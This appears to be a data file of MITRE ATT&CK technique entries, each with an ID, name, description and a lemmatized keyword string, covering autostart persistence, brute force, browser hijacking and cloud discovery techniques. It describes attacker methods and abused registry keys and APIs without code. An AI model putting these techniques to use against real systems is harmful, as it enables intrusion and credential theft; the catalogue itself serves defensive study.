T1547.004,Boot or Logon Autostart Execution: Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\Software Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: Winlogon\Notify - points to notification package DLLs that handle Winlogon events Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",adversary abuse feature winlogon execute dll executable user log windows component responsible action logon logoff secure attention sequence sas trigger ctrl alt delete registry entry malicious modification registry key cause winlogon load execute malicious dll executable specifically following subkey know possibly vulnerable abuse point notification package dll handle winlogon event point user initialization program execute user log point system shell execute user log onadversarie advantage feature repeatedly execute malicious code establish persistence
T1547.005,Boot or Logon Autostart Execution: Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",adversary abuse security support provider ssp execute dll system boot windows ssp dll load local security authority lsa process system start load lsa ssp dll access encrypted plaintext password store windows log user domain password smart card pin ssp configuration store registry key packages packages adversary modify registry key add new ssp load time system boot addsecuritypackage windows api function call
T1547.006,Boot or Logon Autostart Execution: Kernel Modules and Extensions,"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. When used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0).Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through kextload and kextunload commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as ""Legacy System Extensions"" since there is no System Extension for Kernel Programming Interfaces.Adversaries can use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well.",adversary modify kernel automatically execute program system boot loadable kernel modules lkms piece code load unload kernel demand extend functionality kernel need reboot system example type module device driver allow kernel access hardware connect system maliciously lkms type kernel mode rootkit run high operate system privilege ring extension call kext macos load functionality system similar lkms linux kernel responsible enforce security kernel extension run apart kernel kext govern macos security policy kext load unload kextload kextunload command kext need sign developer id grant privilege apple allow sign kernel extension developer privilege sign kext load sip disable sip enable kext signature verify add macos catalina kernel extension deprecate favor system extensions kext allow legacy system extensions system extension kernel programming interfaces adversary use lkms kext conduct persistence privilege escalation system example find wild relevant open source project
T1547.007,Boot or Logon Autostart Execution: Re-opened Applications,"Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to ""Reopen windows when logging back in"". Applications listed in this file are automatically reopened upon the user’s next logon.Adversaries can establish Persistence by adding a malicious application path to the com.apple.loginwindow..plist file to execute payloads when a user logs in.",adversary modify plist file automatically run application user log user log restart macos graphical user interface gui prompt provide user checkbox reopen window log application list file automatically reopen user logon adversary establish persistence add malicious application path plist file execute payload user log
T1547.008,Boot or Logon Autostart Execution: LSASS Driver,"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.",adversary modify add lsass driver obtain persistence compromised system windows security subsystem set component manage enforce security policy computer domain local security authority lsa main component responsible local security policy user authentication lsa include multiple dynamic link library dlls associate security function run context lsa subsystem service lsass process adversary target lsass driver obtain persistence replace add illegitimate driver hijack execution flow adversary use lsa operation continuously execute malicious payload
T1547.009,Boot or Logon Autostart Execution: Shortcut Modification,"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",adversary create modify shortcut execute program system boot user login shortcut symbolic link reference file program open execute shortcut click execute system startup process adversary abuse shortcut startup folder execute tool achieve persistence payload infection chain spearphishing attachment adversary create new shortcut means indirection abuse masquerade malicious shortcut appear legitimate program adversary edit target path entirely replace exist shortcut malware execute instead intend legitimate program shortcut abuse establish persistence implement method example lnk browser extension modify browser extensions persistently launch malware
T1547.010,Boot or Logon Autostart Execution: Port Monitors,"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup. Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors. The Registry key contains entries for the following:Local Port Standard TCP/IP Port USB Monitor WSD PortAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",adversary use port monitor run adversary supply dll system boot persistence privilege escalation port monitor set addmonitor api set dll load startup alternatively arbitrary dll load permission allow write fully qualify pathname dll registry key contain entry follow local port standard tcp ip port usb monitor wsd portadversarie use technique load malicious code startup persist system reboot execute system
T1547.012,Boot or Logon Autostart Execution: Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the AddPrintProcessor API call with an account that has SeLoadDriverPrivilege enabled. Alternatively, a print processor can be registered to the print spooler service by adding the HKLM\SYSTEM\ The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",adversary abuse print processor run malicious dll system boot persistence privilege escalation print processor dll load print spooler service boot adversary abuse print spooler service add print processor load malicious dll startup print processor instal addprintprocessor api account seloaddriverprivilege enable alternatively print processor register print spooler service add print spooler service run system level permission print processor instal adversary run elevated privilege
T1547.013,Boot or Logon Autostart Execution: XDG Autostart Entries,"Adversaries may modify XDG autostart entries to execute programs or commands during system boot. Linux desktop environments that are XDG compliant implement functionality for XDG autostart entries. These entries will allow an application to automatically start during the startup of a desktop environment after user logon. By default, XDG autostart entries are stored within the /etc/xdg/autostart or ~/.config/autostart directories and have a .desktop file extension.Within an XDG autostart entry file, the Type key specifies if the entry is an application (type 1), link (type 2) or directory (type 3). The Name key indicates an arbitrary name assigned by the creator and the Exec key indicates the application and command line arguments to execute.Adversaries may use XDG autostart entries to maintain persistence by executing malicious commands and payloads, such as remote access tools, during the startup of a desktop environment. Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user. Adversaries may also use Masquerading to make XDG autostart entries look as if they are associated with legitimate programs.",adversary modify xdg autostart entry execute program command system boot linux desktop environment xdg compliant implement functionality xdg autostart entry entry allow application automatically start startup desktop environment user logon default xdg autostart entry store xdg autostart autostart directory file extension xdg autostart entry file type key specify entry application type link type directory type key indicate arbitrary assign creator exec key indicate application command line argument execute adversary use xdg autostart entry maintain persistence execute malicious command payload remote access tool startup desktop environment command include xdg autostart entry execute user logon context currently log user adversary use masquerade xdg autostart entry look associate legitimate program
T1547.014,Boot or Logon Autostart Execution: Active Setup,"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. These programs will be executed under the context of the user and will have the account's associated permissions level.Adversaries may abuse Active Setup by creating a key under HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\ and setting a malicious value for StubPath. This value will serve as the program that will be executed when a user logs into the computer.Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",adversary achieve persistence add registry key active setup local machine active setup windows mechanism execute program user log value store registry key execute user log computer program execute context user account associate permission level adversary abuse active setup create key set malicious value stubpath value serve program execute user log computer adversary abuse component execute malware remote access tool maintain persistence system reboot adversary use masquerade registry entry look associate legitimate program
T1547.015,Boot or Logon Autostart Execution: Login Items,"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. Shared file list login items can be set using scripting languages such as AppleScript, whereas the Service Management Framework uses the API call SMLoginItemSetEnabled.Login items installed using the Service Management Framework leverage launchd, are not visible in the System Preferences, and can only be removed by the application that created them. Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.Adversaries can utilize AppleScript and Native API calls to create a login item to spawn malicious executables.",adversary add login item execute user login gain persistence escalate privilege login item application document folder server connection automatically launch user log shared file list login item set scripting language applescript service management framework use api smloginitemsetenabled login item instal service management framework leverage launchd visible system preferences remove application create user application use login item configure user environment launch commonly service application email chat music application adversary utilize applescript native api call create login item spawn malicious executable
T1037,Boot or Logon Initialization Scripts,"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely. Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",adversary use script automatically execute boot logon initialization establish persistence initialization script perform administrative function execute program send information internal logging server script vary base operate system apply locally remotely adversary use script maintain persistence single system depend access configuration logon script local credential administrator account necessary adversary able escalate privilege boot logon initialization script run high privilege
T1037.001,Boot or Logon Initialization Scripts: Logon Script (Windows),"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",adversary use windows logon script automatically execute logon initialization establish persistence windows allow logon script run specific user group user log system adversary use script maintain persistence single system depend access configuration logon script local credential administrator account necessary
T1037.002,Boot or Logon Initialization Scripts: Login Hook,"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the /Library/Preferences/com.apple.loginwindow.plist file and can be modified using the defaults command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks. Adversaries can add or insert a path to a malicious script in the com.apple.loginwindow.plist file, using the LoginHook or LogoutHook key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.Note: Login hooks were deprecated in 10.11 version of macOS in favor of Launch Daemon and Launch Agent",adversary use login hook establish persistence execute user logon login hook plist file point specific script execute root privilege user logon plist file locate preferences file modify default command line utility behavior logout hook script execute user logout hook require administrator permission modify create hook adversary add insert path malicious script file loginhook logouthook key value pair malicious script execute user login login hook exist adversary add additional command exist login hook login logout hook system time note login hook deprecate version macos favor launch daemon launch agent
T1037.003,Boot or Logon Initialization Scripts: Network Logon Script,"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems. Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",adversary use network logon script automatically execute logon initialization establish persistence network logon script assign active directory group policy objects logon script run privilege user assign depend system network initialize script apply potentially system adversary use script maintain persistence network depend access configuration logon script local credential administrator account necessary
T1037.004,Boot or Logon Initialization Scripts: RC Scripts,"Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.Adversaries can establish persistence by adding a malicious binary path or shell commands to rc.local, rc.common, and other RC scripts specific to the Unix-like distribution. Upon reboot, the system executes the script's contents as root, resulting in persistence.Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd.",adversary establish persistence modify rc script execute unix like system startup file allow system administrator map start custom service startup different run level rc script require root privilege modify adversary establish persistence add malicious binary path shell command rc script specific unix like distribution reboot system execute script content root result persistence adversary abuse rc script especially effective lightweight unix like distribution root user default iot embedded system unix like system move systemd deprecate use rc script deprecate mechanism macos favor launchd
T1037.005,Boot or Logon Initialization Scripts: Startup Items,"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.This is technically a deprecated technology (superseded by Launch Daemon), and thus the appropriate folder, /Library/StartupItems isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism. Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",adversary use startup item automatically execute boot initialization establish persistence startup item execute final phase boot process contain shell script executable file configuration information system determine execution order startup item technically deprecate technology supersede launch daemon appropriate folder startupitems guarantee exist system default appear exist default macos sierra startup item directory executable configuration property list plist reside level directory adversary create appropriate folder file startupitems directory register persistence mechanism additionally startupitems run bootup phase macos run elevated root user
T1176,Browser Extensions,"Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.Previous to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files. In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction.Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.",adversary abuse internet browser extension establish persistent access victim system browser extension plugin small program add functionality customize aspect internet browser instal directly browser app store generally access permission browser access malicious extension instal browser malicious app store download masquerade legitimate extension social engineering adversary compromise system security limit browser app store difficult malicious extension defeat automate scanner depend browser adversary manipulate extension update url install update adversary control server manipulate mobile configuration file silently install additional extension previous macos adversary silently install browser extension command line profile tool install malicious file macos use profile tool long install configuration profile file plant instal user interaction extension instal browse website background steal information user enter browser include credential installer rat persistence instance botnet persistent backdoor malicious chrome extension
T1217,Browser Information Discovery,"Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.Browser information may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser.Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., %APPDATA%/Google/Chrome).",adversary enumerate information browser learn compromise environment datum save browser bookmark account browsing history reveal variety personal information user banking site relationship interest social medium etc detail internal network resource server tool dashboard related infrastructure browser information highlight additional target adversary access valid credential especially credential file associate login cache browser specific storage location vary base platform application browser information typically store local file database chrome
T1185,Browser Session Hijacking,"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights.Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.",adversary advantage security vulnerability inherent functionality browser software change content modify user behavior intercept information browser session hijacking technique specific example adversary inject software browser allow inherit cookie http session ssl client certificate user use browser way pivot authenticate intranet execute browser base behavior pivot require specific process permission sedebugprivilege high integrity administrator right example involve pivot browser traffic adversary browser user browser set proxy redirect web traffic alter user traffic way proxy connection sever soon browser close adversary assume security context whichever browser process proxy inject browser typically create new process tab open permission certificate separate accordingly permission adversary potentially browse resource intranet sharepoint webmail accessible browser browser sufficient permission browser pivoting bypass security provide factor authentication
T1110,Brute Force,"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to Valid Accounts within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as OS Credential Dumping, Account Discovery, or Password Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such as External Remote Services as part of Initial Access.",adversary use brute force technique gain access account password unknown password hash obtain knowledge password account set account adversary systematically guess password repetitive iterative mechanism brute force password place interaction service check validity credential offline previously acquire credential datum password hash brute force credential place point breach example adversary attempt brute force access valid accounts victim environment leverage knowledge gather post compromise behavior os credential dumping account discovery password policy discovery adversary combine brute forcing activity behavior external remote services initial access
T1110.001,Brute Force: Password Guessing,"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:SSH (22/TCP) Telnet (23/TCP) FTP (21/TCP) NetBIOS / SMB / Samba (139/TCP & 445/TCP) LDAP (389/TCP) Kerberos (88/TCP) RDP / Terminal Services (3389/TCP) HTTP/HTTP Management Services (80/TCP & 443/TCP) MSSQL (1433/TCP) Oracle (1521/TCP) MySQL (3306/TCP) VNC (5900/TCP) SNMP (161/UDP and 162/TCP/UDP)In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",adversary prior knowledge legitimate credential system environment guess password attempt access account knowledge password account adversary opt systematically guess password repetitive iterative mechanism adversary guess login credential prior knowledge system environment password operation list common password password guessing account target policy password complexity use policy lock account number fail attempt guess password risky option cause numerous authentication failure account lockout depend organization login failure policy typically management service commonly port guess password commonly target service include follow ssh tcp telnet tcp ftp tcp netbios smb samba tcp tcp ldap tcp kerberos tcp rdp terminal services tcp http http management services tcp tcp mssql tcp oracle tcp mysql tcp vnc tcp snmp udp tcp addition management service adversary target single sign sso cloud base application utilize federated authentication protocol externally face email application office default environment ldap kerberos connection attempt likely trigger event smb create windows logon failure event id
T1110.002,Brute Force: Password Cracking,"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. OS Credential Dumping can be used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option. Further, adversaries may leverage Data from Configuration Repository in order to obtain hashed credentials for network devices. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",adversary use password cracking attempt recover usable credential plaintext password credential material password hash obtain os credential dumping obtain password hash adversary far pass hash option adversary leverage data configuration repository order obtain hashed credential network device technique systematically guess password compute hash available adversary use pre computed rainbow table crack hash crack hash usually adversary control system outside target network result plaintext password result successfully crack hash log system resource service account access
T1110.003,Brute Force: Password Spraying,"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:SSH (22/TCP) Telnet (23/TCP) FTP (21/TCP) NetBIOS / SMB / Samba (139/TCP & 445/TCP) LDAP (389/TCP) Kerberos (88/TCP) RDP / Terminal Services (3389/TCP) HTTP/HTTP Management Services (80/TCP & 443/TCP) MSSQL (1433/TCP) Oracle (1521/TCP) MySQL (3306/TCP) VNC (5900/TCP)In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",adversary use single small list commonly password different account attempt acquire valid account credential password spraying use password small list commonly password match complexity policy domain login attempt password different account network avoid account lockout normally occur brute force single account password typically management service commonly port password spray commonly target service include follow ssh tcp telnet tcp ftp tcp netbios smb samba tcp tcp ldap tcp kerberos tcp rdp terminal services tcp http http management services tcp tcp mssql tcp oracle tcp mysql tcp vnc addition management service adversary target single sign sso cloud base application utilize federated authentication protocol externally face email application office default environment ldap kerberos connection attempt likely trigger event smb create windows logon failure event id
T1110.004,Brute Force: Credential Stuffing,"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:SSH (22/TCP) Telnet (23/TCP) FTP (21/TCP) NetBIOS / SMB / Samba (139/TCP & 445/TCP) LDAP (389/TCP) Kerberos (88/TCP) RDP / Terminal Services (3389/TCP) HTTP/HTTP Management Services (80/TCP & 443/TCP) MSSQL (1433/TCP) Oracle (1521/TCP) MySQL (3306/TCP) VNC (5900/TCP)In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.",adversary use credential obtain breach dump unrelated account gain access target account credential overlap occasionally large number username password pair dump online website service compromise user account credential access information useful adversary attempt compromise account take advantage tendency user use password personal business account credential stuffing risky option cause numerous authentication failure account lockout depend organization login failure policy typically management service commonly port stuff credential commonly target service include follow ssh tcp telnet tcp ftp tcp netbios smb samba tcp tcp ldap tcp kerberos tcp rdp terminal services tcp http http management services tcp tcp mssql tcp oracle tcp mysql tcp vnc addition management service adversary target single sign sso cloud base application utilize federated authentication protocol externally face email application office
T1612,Build Image on Host,"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize Deploy Container using that custom image. If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",adversary build container image directly host bypass defense monitor retrieval malicious image public registry remote build request send docker api include dockerfile pull vanilla base image alpine public local registry build custom image adversary advantage build api build custom image host include malware download server utilize deploy container custom image base image pull public registry defense likely detect image malicious vanilla image base image reside local registry pull consider suspicious image environment
T1115,Clipboard Data,"Adversaries may collect data stored in the clipboard from users copying information within or between applications. For example, on Windows adversaries can access clipboard data by using clip.exe or Get-Clipboard.macOS and Linux also have commands, such as pbpaste, to grab clipboard contents.",adversary collect datum store clipboard user copy information application example windows adversary access clipboard datum linux command pbpaste grab clipboard content
T1651,Cloud Administration Command,"Adversaries may abuse cloud management services to execute commands within virtual machines or hybrid-joined devices. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. Similarly, in Azure AD environments, Microsoft Endpoint Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to the Azure AD.If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines or on-premises hybrid-joined devices. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a Trusted Relationship to execute commands in connected virtual machines.",adversary abuse cloud management service execute command virtual machine hybrid join device resource aws systems manager azure runcommand runbooks allow user remotely run script virtual machine leverage instal virtual machine agent similarly azure ad environment microsoft endpoint manager allow global intune administrators run script system premise device join azure adversary gain administrative access cloud environment able abuse cloud management service execute command environment virtual machine premises hybrid join device additionally adversary compromise service provider delegate administrator account similarly able leverage trusted relationship execute command connect virtual machine
T1580,Cloud Infrastructure Discovery,"An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a DescribeInstances API within the Amazon EC2 API that can return information about one or more instances within an account, the ListBuckets API that returns a list of all buckets owned by the authenticated sender of the request, the HeadBucket API to determine a bucket’s existence along with access permissions of the request sender, or the GetPublicAccessBlock API to retrieve access block configuration for a bucket.An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.",adversary attempt discover infrastructure resource available infrastructure service iaas environment include compute service resource instance virtual machine snapshot resource service include storage database service cloud provider offer method api command issue cli serve information infrastructure example aws provide describeinstances api amazon api return information instance account listbuckets api return list bucket own authenticate sender request headbucket api determine bucket existence access permission request sender getpublicaccessblock api retrieve access block configuration bucket adversary enumerate resource compromise user access key determine available user adversary use information determine potential value database discover requirement access unlike cloud service discovery technique focus discovery component provide service service
T1538,Cloud Service Dashboard,"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",adversary use cloud service dashboard gui steal credential gain useful information operational cloud environment specific service resource feature example gcp command center view asset finding potential security risk run additional query find public ip address open port depend configuration environment adversary able enumerate information graphical dashboard api allow adversary gain information make api request
T1526,Cloud Service Discovery,"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable Cloud Logs.",adversary attempt enumerate cloud service run system gain access method differ platform service paas infrastructure service iaas software service saas service exist cloud provider include continuous integration continuous delivery ci cd lambda functions azure ad etc include security service aws guardduty microsoft defender cloud logging service aws cloudtrail google cloud audit logs adversary attempt discover information service enable environment azure tool api azure ad graph api azure resource manager api enumerate resource service include application management group resource policy definition relationship accessible identity example stormspotter open source tool enumerate construct graph azure resource service pacu open source aws exploitation framework support 